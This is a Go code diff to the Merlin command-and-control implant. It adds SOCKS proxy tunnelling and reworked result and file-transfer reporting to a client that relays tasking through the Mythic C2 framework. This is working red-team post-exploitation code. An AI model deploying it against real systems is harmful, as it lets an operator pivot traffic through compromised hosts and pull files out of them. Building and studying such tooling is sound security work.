@@ -21,6 +21,7 @@ along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
 package main
 
 import (
+	"bytes"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -38,6 +39,11 @@ import (
 	"github.com/fatih/color"
 	"github.com/google/uuid"
 )
+
+// SOCKS connection tracking maps (mirrors mythic.go's socksConnection/mythicSocksConnection/socksCounter)
+var socksConnection = sync.Map{}      // Mythic server_id (int32) → Merlin UUID
+var mythicSocksConnection = sync.Map{} // Merlin UUID → Mythic server_id (int32)
+var socksCounter = sync.Map{}          // Merlin UUID → int (packet index counter)
 
 // PubSubClient adapts the generic Transport to Merlin's clients.Client interface
 type PubSubClient struct {
@@ -627,6 +633,71 @@ func (p *PubSubClient) convertMythicTasksToMerlin(taskData map[string]interface{
 	return base
 }
 
+// mythicSocks is the Mythic wire format for SOCKS data (matches mythic/structs.go Socks struct)
+type mythicSocks struct {
+	ServerId int32  `json:"server_id"`
+	Data     string `json:"data"`
+	Exit     bool   `json:"exit"`
+}
+
+// convertSocksToJobs converts Mythic SOCKS messages to Merlin jobs (ported from mythic.go convertSocksToJobs)
+func (p *PubSubClient) convertSocksToJobs(socks []mythicSocks) (messages.Base, error) {
+	base := messages.Base{
+		Type: messages.JOBS,
+		ID:   uuid.MustParse(p.payloadUUID),
+	}
+
+	var returnJobs []jobs.Job
+
+	for _, sock := range socks {
+		job := jobs.Job{
+			AgentID: uuid.MustParse(p.payloadUUID),
+			Type:    jobs.SOCKS,
+		}
+		payload := jobs.Socks{
+			Close: sock.Exit,
+		}
+
+		// Translate Mythic's server_id to a Merlin UUID
+		id, ok := socksConnection.Load(sock.ServerId)
+		if !ok {
+			// New SOCKS connection — create bidirectional mapping
+			id = uuid.New()
+			socksConnection.Store(sock.ServerId, id)
+			mythicSocksConnection.Store(id, sock.ServerId)
+			socksCounter.Store(id, 0)
+
+			// Spoof initial SOCKS5 handshake (version 5, 1 method, no auth)
+			payload.ID = id.(uuid.UUID)
+			payload.Data = []byte{0x05, 0x01, 0x00}
+			payload.Index = 0
+			job.Payload = payload
+			returnJobs = append(returnJobs, job)
+		}
+		payload.ID = id.(uuid.UUID)
+
+		// Base64 decode Mythic's data
+		var err error
+		payload.Data, err = base64.StdEncoding.DecodeString(sock.Data)
+		if err != nil {
+			return base, fmt.Errorf("failed to base64 decode SOCKS data: %w", err)
+		}
+
+		// Track packet ordering with index counter
+		i, ok := socksCounter.Load(id)
+		if !ok {
+			return base, fmt.Errorf("SOCKS counter not found for UUID: %s", id)
+		}
+		payload.Index = i.(int) + 1
+		job.Payload = payload
+		socksCounter.Store(id, i.(int)+1)
+		returnJobs = append(returnJobs, job)
+	}
+
+	base.Payload = returnJobs
+	return base, nil
+}
+
 // Listen starts listening for messages from the server
 func (p *PubSubClient) Listen() ([]messages.Base, error) {
 	p.mu.Lock()
@@ -700,7 +771,7 @@ func (p *PubSubClient) Listen() ([]messages.Base, error) {
 					color.Yellow(fmt.Sprintf("[DEBUG] Decrypted task data: %v", taskData))
 				}
 
-				// Convert to Merlin messages.Base
+				// Convert tasks to Merlin messages.Base
 				base := p.convertMythicTasksToMerlin(taskData)
 
 				if core.Verbose {
@@ -710,6 +781,32 @@ func (p *PubSubClient) Listen() ([]messages.Base, error) {
 				p.mu.Lock()
 				p.pendingJobs = append(p.pendingJobs, base)
 				p.mu.Unlock()
+
+				// Process SOCKS data from server response (present in both get_tasking and post_response responses)
+				if socksInterface, ok := taskData["socks"]; ok {
+					if socksArray, ok := socksInterface.([]interface{}); ok && len(socksArray) > 0 {
+						// Convert to typed struct
+						var mythicSocksData []mythicSocks
+						socksJSON, err := json.Marshal(socksArray)
+						if err == nil {
+							if err := json.Unmarshal(socksJSON, &mythicSocksData); err == nil && len(mythicSocksData) > 0 {
+								socksBase, err := p.convertSocksToJobs(mythicSocksData)
+								if err != nil {
+									if core.Verbose {
+										color.Red(fmt.Sprintf("[-] Failed to convert SOCKS data: %v", err))
+									}
+								} else if len(socksBase.Payload.([]jobs.Job)) > 0 {
+									if core.Debug {
+										color.Yellow(fmt.Sprintf("[DEBUG] Received %d SOCKS jobs from server", len(socksBase.Payload.([]jobs.Job))))
+									}
+									p.mu.Lock()
+									p.pendingJobs = append(p.pendingJobs, socksBase)
+									p.mu.Unlock()
+								}
+							}
+						}
+					}
+				}
 			}
 		}()
 
@@ -796,56 +893,104 @@ func (p *PubSubClient) convertToMythicFormat(msg messages.Base) map[string]inter
 
 	case messages.JOBS:
 		jobsArray, ok := msg.Payload.([]jobs.Job)
-		if ok && len(jobsArray) > 0 {
-			if jobsArray[0].Type == jobs.RESULT || jobsArray[0].Type == jobs.AGENTINFO || jobsArray[0].Type == jobs.FILETRANSFER {
-				mythicMsg["action"] = "post_response"
+		if !ok || len(jobsArray) == 0 {
+			mythicMsg["action"] = "get_tasking"
+			mythicMsg["tasking_size"] = -1
+			break
+		}
 
-				responses := make([]interface{}, 0, len(jobsArray))
-				for _, job := range jobsArray {
-					response := map[string]interface{}{
-						"task_id": job.ID,
-					}
+		// Separate jobs into responses and SOCKS data (mirrors mythic.go Construct)
+		responses := make([]interface{}, 0)
+		socksData := make([]mythicSocks, 0)
 
-					switch job.Type {
-					case jobs.RESULT:
-						result := job.Payload.(jobs.Results)
-						if result.Stdout != "" {
-							response["user_output"] = result.Stdout
-						}
-						if result.Stderr != "" {
-							response["user_output"] = result.Stderr
-						}
-						response["completed"] = true
-						response["status"] = "success"
-					case jobs.AGENTINFO:
-						infoBytes, _ := json.Marshal(job.Payload)
-						response["user_output"] = string(infoBytes)
-						response["completed"] = true
-						response["status"] = "success"
-					case jobs.FILETRANSFER:
-						ft := job.Payload.(jobs.FileTransfer)
-						if ft.IsDownload {
-							response["user_output"] = fmt.Sprintf("File uploaded: %s", ft.FileLocation)
-						} else {
-							response["user_output"] = fmt.Sprintf("File downloaded: %s", ft.FileLocation)
-							response["download"] = map[string]interface{}{
-								"path": ft.FileLocation,
-								"data": ft.FileBlob,
-							}
-						}
-						response["completed"] = true
-						response["status"] = "success"
-					}
+		for _, job := range jobsArray {
+			switch job.Type {
+			case jobs.SOCKS:
+				sockMsg := job.Payload.(jobs.Socks)
 
-					responses = append(responses, response)
+				// Drop the spoofed SOCKS handshake response (0x05, 0x00) — Mythic doesn't need it
+				if bytes.Equal(sockMsg.Data, []byte{0x05, 0x00}) {
+					break
 				}
 
-				mythicMsg["responses"] = responses
-			} else {
-				mythicMsg["action"] = "get_tasking"
-				mythicMsg["tasking_size"] = -1
+				sock := mythicSocks{
+					Exit: sockMsg.Close,
+				}
+
+				// Translate Merlin UUID → Mythic server_id
+				id, ok := mythicSocksConnection.Load(sockMsg.ID)
+				if !ok {
+					if core.Verbose {
+						color.Red(fmt.Sprintf("[-] SOCKS connection ID %s not found in mapping", sockMsg.ID))
+					}
+					break
+				}
+				sock.ServerId = id.(int32)
+
+				// Base64 encode the data for Mythic
+				sock.Data = base64.StdEncoding.EncodeToString(sockMsg.Data)
+				socksData = append(socksData, sock)
+
+				// Clean up mappings on connection close
+				if sockMsg.Close {
+					socksConnection.Delete(id)
+					mythicSocksConnection.Delete(sockMsg.ID)
+				}
+
+			case jobs.RESULT:
+				result := job.Payload.(jobs.Results)
+				response := map[string]interface{}{
+					"task_id":   job.ID,
+					"completed": true,
+					"status":    "success",
+				}
+				if result.Stdout != "" {
+					response["user_output"] = result.Stdout
+				}
+				if result.Stderr != "" {
+					response["user_output"] = result.Stderr
+				}
+				responses = append(responses, response)
+
+			case jobs.AGENTINFO:
+				infoBytes, _ := json.Marshal(job.Payload)
+				response := map[string]interface{}{
+					"task_id":     job.ID,
+					"user_output": string(infoBytes),
+					"completed":   true,
+					"status":      "success",
+				}
+				responses = append(responses, response)
+
+			case jobs.FILETRANSFER:
+				ft := job.Payload.(jobs.FileTransfer)
+				response := map[string]interface{}{
+					"task_id":   job.ID,
+					"completed": true,
+					"status":    "success",
+				}
+				if ft.IsDownload {
+					response["user_output"] = fmt.Sprintf("File uploaded: %s", ft.FileLocation)
+				} else {
+					response["user_output"] = fmt.Sprintf("File downloaded: %s", ft.FileLocation)
+					response["download"] = map[string]interface{}{
+						"path": ft.FileLocation,
+						"data": ft.FileBlob,
+					}
+				}
+				responses = append(responses, response)
+			}
+		}
+
+		// Build the appropriate message type
+		if len(responses) > 0 || len(socksData) > 0 {
+			mythicMsg["action"] = "post_response"
+			mythicMsg["responses"] = responses
+			if len(socksData) > 0 {
+				mythicMsg["socks"] = socksData
 			}
 		} else {
+			// All SOCKS jobs were dropped (e.g., spoofed handshake) — send get_tasking instead
 			mythicMsg["action"] = "get_tasking"
 			mythicMsg["tasking_size"] = -1
 		}
